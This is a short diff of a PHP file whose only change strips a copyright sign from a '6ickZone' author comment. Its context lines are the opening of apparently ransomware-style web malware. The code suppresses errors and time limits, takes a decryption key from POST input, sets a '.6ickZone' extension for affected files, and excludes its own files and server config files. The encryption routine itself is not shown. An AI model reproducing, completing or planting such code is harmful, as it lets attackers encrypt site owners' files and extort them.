@@ -1,5 +1,5 @@
 <?php
-/*©6ickZone - 6ickwhispers@gmail.com*/
+/*6ickZone - 6ickwhispers@gmail.com*/
 @set_time_limit(0); @error_reporting(0);
 $k=isset($_POST['decryption_key'])?$_POST['decryption_key']:'';
 $e='.6ickZone'; $x=[basename(__FILE__),'encrypt.php','.htaccess','.user.ini'];
